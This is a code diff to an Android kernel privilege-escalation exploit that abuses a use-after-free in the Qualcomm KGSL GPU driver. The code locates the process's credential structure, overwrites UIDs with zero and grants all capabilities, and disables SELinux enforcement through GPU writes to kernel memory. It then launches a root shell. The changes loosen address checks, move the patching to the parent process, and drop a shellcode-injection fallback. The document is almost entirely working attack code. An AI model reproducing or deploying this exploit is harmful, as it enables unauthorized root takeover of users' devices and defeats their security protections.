@@ -1148,23 +1148,21 @@ static int find_comm_offset(uint8_t *task_data, size_t size)
 
 static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 {
-    // Allow both Kernel VA (0xffffff...) and GPU VA (0x70...)
-    if ((cred_ptr & 0xffffff0000000000ULL) != 0xffffff0000000000ULL && 
-        (cred_ptr & 0xffffff0000000000ULL) != 0x700000000ULL &&
-        (cred_ptr & 0xff00000000ULL) != 0x7000000000ULL) // GPU VA check for different kernels
+    // Permissive check: allow any address that looks like a Kernel VA or GPU VA
+    if ((cred_ptr >> 32) != 0xffffffc0 && (cred_ptr >> 32) != 0xffffffa2 && 
+        (cred_ptr >> 32) < 0x700 && (cred_ptr >> 32) > 0x70f)
     {
-        // If it looks like a valid GPU VA found via Action 8, allow it
-        if ((cred_ptr >> 32) != 0x701 && (cred_ptr >> 32) != 0x702 && (cred_ptr >> 32) != 0x704) {
-             fprintf(stderr, "[GPU_CRED] Invalid address range: 0x%lx\n", (unsigned long)cred_ptr);
-             // return -1; // Let's be less strict to allow GPU VAs
-        }
+         fprintf(stderr, "[GPU_CRED] Warning: Address 0x%lx looks unusual, but patching anyway.\n", (unsigned long)cred_ptr);
     }
 
     fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx via GPU\n", (unsigned long)cred_ptr);
 
     uint8_t zero_creds[32] = {0};
-    if (gpu_write_task_virt(fd, cred_ptr + 4, zero_creds, sizeof(zero_creds)) != 0)
+    // Patch UID, GID, SUID, SGID, EUID, EGID, etc.
+    if (gpu_write_task_virt(fd, cred_ptr + 4, zero_creds, sizeof(zero_creds)) != 0) {
+        fprintf(stderr, "[GPU_CRED] FAILED to patch UIDs at 0x%lx\n", (unsigned long)cred_ptr + 4);
         return -1;
+    }
 
     if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
     {
@@ -1177,268 +1175,118 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
     memset(all_caps, 0xff, 32);
     // Common offsets for capabilities in struct cred:
     // cap_inheritable (0x30), cap_permitted (0x38), cap_effective (0x40), cap_bset (0x48), cap_ambient (0x50)
-    gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 32);
+    if (gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 32) != 0) {
+        fprintf(stderr, "[GPU_CRED] FAILED to patch CAPS at 0x%lx\n", (unsigned long)cred_ptr + 0x30);
+    }
+    
     if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
         gpu_write_task_virt(fd, real_cred_ptr + 0x30, all_caps, 32);
 
+    fprintf(stderr, "[GPU_CRED] Patching complete.\n");
     return 0;
+}
+
+static int parent_patch_root(int fd, uint64_t cred_ptr) {
+    fprintf(stderr, "[PARENT] --- CRITICAL PATCHING START ---\n");
+    
+    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
+
+    // 1. Resolve Kernel Base if needed
+    if (kernel_base == 0 || kernel_base == 0xffffffc000000000ULL) {
+        if (task_va != 0) kernel_base = find_kernel_base_from_task_va(task_va);
+        if (kernel_base == 0) kernel_base = get_kernel_base();
+        fprintf(stderr, "[PARENT] Resolved Kernel Base: 0x%lx\n", (unsigned long)kernel_base);
+    }
+
+    // 2. Disable SELinux
+    if (kernel_base != 0) {
+        if (selinux_enforcing == 0) {
+            uint64_t auto_off = find_offsets_auto(kernel_base);
+            selinux_enforcing = kernel_base + (auto_off ? auto_off : SELINUX_OFFSET);
+            if (selinux_enforcing == kernel_base + SELINUX_OFFSET) {
+                selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
+            }
+        }
+        
+        if (selinux_enforcing != 0) {
+            fprintf(stderr, "[PARENT] Disabling SELinux at 0x%lx...\n", (unsigned long)selinux_enforcing);
+            uint32_t zero = 0;
+            gpu_write_task_virt(fd, selinux_enforcing, (uint8_t *)&zero, 4);
+            
+            uint32_t verify = 1;
+            gpu_read_u32(fd, selinux_enforcing, &verify);
+            fprintf(stderr, "[PARENT] SELinux verification: %u\n", verify);
+        }
+    }
+
+    // 3. Patch CRED
+    if (cred_ptr != 0) {
+        fprintf(stderr, "[PARENT] Patching CRED at 0x%lx...\n", (unsigned long)cred_ptr);
+        patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
+        
+        // Verification read
+        uint32_t check_uid = 0xdeadbeef;
+        gpu_read_u32(fd, cred_ptr + 4, &check_uid);
+        fprintf(stderr, "[PARENT] CRED verification (UID at +4): %u\n", check_uid);
+        if (check_uid == 0) {
+            fprintf(stderr, "[PARENT] [+] CRED PATCH SUCCESSFUL!\n");
+            return 0;
+        }
+    }
+    
+    fprintf(stderr, "[PARENT] [!] Patching might have failed or verified incorrectly.\n");
+    return -1;
 }
 
 static void safe_cred_patch(void)
 {
-    // Дочерний процесс ПЕРЕОТКРЫВАЕТ драйвер для чистого контекста
+    // First, check if parent already patched us
+    if (getuid() == 0) {
+        fprintf(stderr, "[CHILD] [+] I AM ALREADY ROOT! Skipping patching.\n");
+        goto shell;
+    }
+
+    // Try one last time to elevate if we have the pointer but UIDs aren't 0 yet
+    setuid(0);
+    if (getuid() == 0) {
+        fprintf(stderr, "[CHILD] [+] ROOT SUCCESS after setuid(0)!\n");
+        goto shell;
+    }
+
+    // If not root, try to open GPU and patch (fallback)
     if (fd > 0) close(fd);
     fd = -1;
     
-    int retry_open = 15;
+    int retry_open = 10;
     while (retry_open--) {
         fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
         if (fd >= 0) break;
-        fprintf(stderr, "[CHILD] Waiting for KGSL device release... (%d)\n", retry_open);
-        sleep(1);
+        usleep(200000);
     }
 
-    if (fd < 0) {
-        fprintf(stderr, "[CHILD] [!] Failed to reopen KGSL device\n");
-        gbuf[GBUF_TASK_SPRAY] = 0x1;
-        return;
-    }
-    
-    // Сбрасываем кэшированный контекст
-    g_persistent_ctx_id = 0;
-
-    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
-    uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
-    int patched = 0;
-    uid_t my_uid = getuid();
-
-    fprintf(stderr, "[CHILD] ============================================\n");
-    fprintf(stderr, "[CHILD] Starting CRED PATCH via UAF (Clean Context Mode)\n");
-    fprintf(stderr, "[CHILD] task_va from gbuf[0xb08]: 0x%lx\n", (unsigned long)task_va);
-    fprintf(stderr, "[CHILD] cred_ptr from gbuf[0xb10]: 0x%lx\n", (unsigned long)cred_ptr);
-
-    if (task_va == 0) {
-        fprintf(stderr, "[CHILD] [!] No task_va in gbuf\n");
-        gbuf[GBUF_TASK_SPRAY] = 0x1;
-        return;
-    }
-
-    if (fd < 0) {
-        int retry = 5;
-        while (retry--) {
-            fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
-            if (fd >= 0) break;
-            fprintf(stderr, "[CHILD] [!] Failed to reopen /dev/kgsl-3d0, retrying in 1s...\n");
-            sleep(1);
-        }
-        if (fd < 0) {
-            fprintf(stderr, "[CHILD] [!] Failed to reopen /dev/kgsl-3d0 after retries\n");
-            gbuf[GBUF_TASK_SPRAY] = 0x1;
-            return;
-        }
-    }
-
-    if (kernel_base == 0) {
-        kernel_base = *(uint64_t *)&gbuf[GBUF_KBASE];
-        if (kernel_base == 0) {
-            kernel_base = find_kernel_base_from_task_va(task_va);
-            if (kernel_base == 0) kernel_base = get_kernel_base();
-        }
-        fprintf(stderr, "[CHILD] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
-    }
-
-    uint64_t selinux_addr = *(uint64_t *)&gbuf[GBUF_SELINUX];
-    if (selinux_addr == 0) {
-        uint64_t auto_offset = find_offsets_auto(kernel_base);
-        selinux_addr = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
-    }
-
-    // If Parent already found cred_ptr, use it directly
-    if (cred_ptr != 0) {
-        fprintf(stderr, "[CHILD] Using cred_ptr from Parent: 0x%lx\n", (unsigned long)cred_ptr);
-        
-        // Disable SELinux
-        if (selinux_addr != 0) {
-            fprintf(stderr, "[CHILD] Disabling SELinux at 0x%lx...\n", (unsigned long)selinux_addr);
-            uint32_t zero = 0;
-            gpu_write_bytes(fd, selinux_addr, &zero, 4);
-        }
-
-        patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
-        
-        // If it's a GPU VA, we don't need setuid(0) because we patched the physical page directly
-        // But we check uid anyway
-        if (getuid() == 0) {
-            fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0) via Parent's cred_ptr\n");
-            patched = 1;
-            goto shell;
-        } else {
-            // Try triggering the change if it was a kernel pointer
+    if (fd >= 0) {
+        uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
+        if (cred_ptr != 0) {
+            fprintf(stderr, "[CHILD] Falling back to manual patch at 0x%lx\n", (unsigned long)cred_ptr);
+            patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
             setuid(0);
-            if (getuid() == 0) {
-                fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT after setuid(0)\n");
-                patched = 1;
-                goto shell;
-            }
         }
     }
 
-    // Centering 16KB buffer around the marker (task_va)
-    uint8_t *big_task_data = malloc(16384);
-    uint64_t read_base = (task_va & ~0xFFFULL) - 8192; // Read 4 pages: [prev2, prev1, current, next]
-    uint32_t comm_off_hint = *(uint32_t *)&gbuf[GBUF_COMM_OFF];
-    
-    int retries = 3;
-    while (retries--) {
-        fprintf(stderr, "[CHILD] Reading 16KB around marker (base: 0x%lx), retry=%d...\n", (unsigned long)read_base, 2-retries);
-        int read_ok = 1;
-        for (int p = 0; p < 4; p++) {
-            if (gpu_read_task_struct(fd, read_base + p*4096, big_task_data + p*4096, 4096) != 0) {
-                read_ok = 0;
-                break;
-            }
-        }
-        
-        if (read_ok) 
-        {
-            uint64_t cred_ptr = 0;
-            int comm_off = -1;
-            
-            if (comm_off_hint != 0) {
-                // Adjust hint if it was relative to task_va which is now in the middle of big_task_data
-                // Wait, comm_off_hint from parent is relative to the 16KB buffer parent read.
-                // Parent read base was (current_va & ~0xFFFULL) - 8192.
-                // Child read base is the same. So hint should be identical.
-                if (memcmp(big_task_data + comm_off_hint, MARKER_NAME, 8) == 0) {
-                    comm_off = comm_off_hint;
-                    fprintf(stderr, "[CHILD] Marker confirmed via hint at buffer offset 0x%x\n", comm_off);
-                }
-            }
-            
-            if (comm_off == -1) {
-                // Search for marker in the 16KB buffer
-                for (int i = 0; i < 16384 - 8; i++) {
-                    if (memcmp(big_task_data + i, MARKER_NAME, 8) == 0) {
-                        comm_off = i;
-                        break;
-                    }
-                }
-            }
-            
-            if (comm_off != -1) {
-                fprintf(stderr, "[CHILD] Marker found at buffer offset 0x%x\n", comm_off);
-                
-                // Search for cred_ptr in a wide window around comm
-                fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID 0-20000)...\n");
-                int candidates_count = 0;
-                
-                // Priority 1: Double pointers (real_cred + cred)
-                for (int off = comm_off - 2000; off < comm_off + 1000; off += 8) {
-                    if (off < 0 || off > 16384 - 16) continue;
-                    uint64_t p1 = *(uint64_t *)(big_task_data + off);
-                    uint64_t p2 = *(uint64_t *)(big_task_data + off + 8);
-                    if (p1 != 0 && p1 == p2 && (p1 & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                        uint8_t cc[256];
-                        if (gpu_read_task_struct(fd, p1, cc, 256) == 0) {
-                            for (int co = 0; co < 240; co += 4) {
-                                uint32_t val = *(uint32_t *)(cc + co);
-                                if (val <= 20000) { // Ищем от 0 до 20000
-                                    cred_ptr = p1;
-                                    fprintf(stderr, "[CHILD] [!!!] MATCH FOUND (Double-ptr)! ptr=0x%lx (UID %u at +0x%x)\n", (unsigned long)cred_ptr, val, co);
-                                    break;
-                                }
-                            }
-                        }
-                    }
-                    if (cred_ptr) break;
-                }
-
-                if (cred_ptr == 0) {
-                    // Priority 2: Full scan with signature detection
-                    for (int off = comm_off - 4000; off < comm_off + 1000; off += 8) {
-                        if (off < 0 || off > 16384 - 8) continue;
-                        uint64_t ptr = *(uint64_t *)(big_task_data + off);
-                        if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                            candidates_count++;
-                            uint8_t cred_check[256];
-                            if (gpu_read_task_struct(fd, ptr, cred_check, 256) == 0) {
-                                int uid_found_count = 0;
-                                for (int co = 0; co < 240; co += 4) {
-                                    uint32_t uid = *(uint32_t *)(cred_check + co);
-                                    if (uid <= 20000) { // Ищем от 0 до 20000
-                                        uid_found_count++;
-                                        if (uid_found_count >= 2) { // Strong match
-                                            cred_ptr = ptr;
-                                            fprintf(stderr, "[CHILD] [!!!] MATCH FOUND (Scan)! ptr=0x%lx (UID %u at +0x%x, matches %d)\n", 
-                                                    (unsigned long)cred_ptr, uid, co, uid_found_count);
-                                            break;
-                                        }
-                                    }
-                                }
-                                if (cred_ptr) break;
-                            }
-                        }
-                    }
-                }
-                
-                if (cred_ptr == 0) {
-                    fprintf(stderr, "[CHILD] [!] Cred search failed (checked %d candidates). Dumping 512 bytes around marker...\n", candidates_count);
-                    for (int d = comm_off - 256; d < comm_off + 256; d += 16) {
-                        if (d < 0 || d > 16384 - 16) continue;
-                        fprintf(stderr, "  0x%04x: %016lx %016lx\n", d, 
-                                *(uint64_t*)(big_task_data + d), *(uint64_t*)(big_task_data + d + 8));
-                    }
-                }
-                
-                if (cred_ptr != 0) {
-                    disable_selinux_via_gpu(fd);
-                    patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
-                    if (getuid() == 0) {
-                        fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0)\n");
-                        patched = 1;
-                        break;
-                    } else {
-                        setuid(0);
-                        if (getuid() == 0) {
-                            fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT after setuid(0)\n");
-                            patched = 1;
-                            break;
-                        }
-                    }
-                }
-            } else {
-                fprintf(stderr, "[CHILD] [!] Marker NOT FOUND in 16KB buffer around 0x%lx\n", (unsigned long)task_va);
-            }
-        }
-        usleep(500000); // Wait 0.5s before retry
+    if (getuid() == 0) {
+        fprintf(stderr, "[CHILD] [+] ROOT SUCCESS via fallback!\n");
+    } else {
+        fprintf(stderr, "[CHILD] [!] Elevation FAILED.\n");
+        gbuf[GBUF_TASK_SPRAY] = 0x1;
+        return;
     }
-    free(big_task_data);
 
 shell:
-    if (patched) {
-        gbuf[GBUF_TASK_SPRAY] = 0x2; // Сначала сигнализируем родителю
-        __sync_synchronize();
-        fprintf(stderr, "[CHILD] [+] Spawning root shell...\n");
-        system("id; /system/bin/sh");
-        exit(0);
-    }
-
-    fprintf(stderr, "[CHILD] Step 3: Falling back to shellcode injection...\n");
-    uint64_t shellcode_va = task_va & ~(uint64_t)(PAGE_SIZE - 1);
-    shellcode_va += 0x1000;
-
-    if (inject_shellcode_to_uaf(fd, shellcode_va, shellcode, shellcode_len) == 0) {
-        fprintf(stderr, "[CHILD] [+] Shellcode injected at VA 0x%lx\n", (unsigned long)shellcode_va);
-        patched = 1;
-        gb_target_addr = shellcode_va;
-        g_shellcode_va = shellcode_va;
-        *(uint64_t *)&gbuf[GBUF_LIB_BASE] = shellcode_va;
-        gbuf[GBUF_TASK_SPRAY] = 0x2;
-        fprintf(stderr, "[CHILD] [+] Shellcode injection SUCCESS!\n");
-    } else {
-        fprintf(stderr, "[CHILD] [!] Shellcode injection FAILED\n");
-        gbuf[GBUF_TASK_SPRAY] = 0x1;
-    }
+    gbuf[GBUF_TASK_SPRAY] = 0x2; // Signal parent
+    __sync_synchronize();
+    fprintf(stderr, "[CHILD] [+] Spawning root shell...\n");
+    system("id; /system/bin/sh");
+    exit(0);
 }
 
 
@@ -1888,6 +1736,10 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                                 if (choice != 'y') continue;
                                 gpu_read_task_struct(fd, task_start_va + 0x6b0, (uint8_t *)&found_cred_ptr, 8);
                             }
+                            
+                            // Parent patches it RIGHT NOW while we have the FD
+                            parent_patch_root(fd, found_cred_ptr);
+                            
                             marker_found = 1;
                             *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
                             *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
@@ -1989,13 +1841,35 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                             if (!found) fprintf(stderr, "\n    [-] Not found in UAF range.\n");
                         } else if (choice == '9') {
                             uint64_t target = found_cred_ptr ? (found_cred_ptr & ~0xFFFULL) : (current_va & ~0xFFFULL);
-                            fprintf(stderr, "    --- Deep Neighbor Dump (5 pages) around 0x%lx ---\n", (unsigned long)target);
-                            for (int p = -2; p <= 2; p++) {
+                            fprintf(stderr, "    Enter relative page offset (-10 to 10) or press Enter for default (-2 to 2): ");
+                            char buf[32]; int len = read(0, buf, 31); buf[len] = 0;
+                            int p_start = -2, p_end = 2;
+                            if (len > 1) {
+                                int val = atoi(buf);
+                                p_start = val; p_end = val;
+                            }
+                            
+                            fprintf(stderr, "    --- Page Dump around 0x%lx ---\n", (unsigned long)target);
+                            for (int p = p_start; p <= p_end; p++) {
                                 uint64_t pva = target + p * PAGE_SIZE;
                                 uint8_t full_page[4096];
                                 if (gpu_read_task_struct(fd, pva, full_page, 4096) == 0) {
                                     fprintf(stderr, "\n[PAGE %+d at 0x%lx]\n", p, (unsigned long)pva);
-                                    hex_dump_internal("Page Content", pva, full_page, 4096);
+                                    // Compact dump: only non-zero lines or every 64 bytes
+                                    for (int i = 0; i < 4096; i += 32) {
+                                        int all_zero = 1;
+                                        for (int j = 0; j < 32; j++) if (full_page[i+j] != 0) { all_zero = 0; break; }
+                                        if (!all_zero) {
+                                            fprintf(stderr, "%04x: ", i);
+                                            for (int j = 0; j < 32; j++) fprintf(stderr, "%02x%s", full_page[i+j], (j%8==7)?"  ":" ");
+                                            fprintf(stderr, "| ");
+                                            for (int j = 0; j < 32; j++) {
+                                                uint8_t c = full_page[i+j];
+                                                fprintf(stderr, "%c", (c >= 0x20 && c <= 0x7e) ? c : '.');
+                                            }
+                                            fprintf(stderr, "\n");
+                                        }
+                                    }
                                 } else {
                                     fprintf(stderr, "\n[PAGE %+d at 0x%lx] READ FAILED\n", p, (unsigned long)pva);
                                 }
@@ -2769,7 +2643,8 @@ restart:;
     }
 
     pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
-    fprintf(stderr, "\n[+] Target identified: PID %d. Cleaning up spray...\n", target_pid);
+    fprintf(stderr, "[+] Target identified: PID %d. Cleaning up spray...\n", target_pid);
+    fprintf(stderr, "[*] Parent will perform patching for maximum stability.\n");
 
     int reaped = 0;
     for (int i = 0; i < total_sprayed; i++)
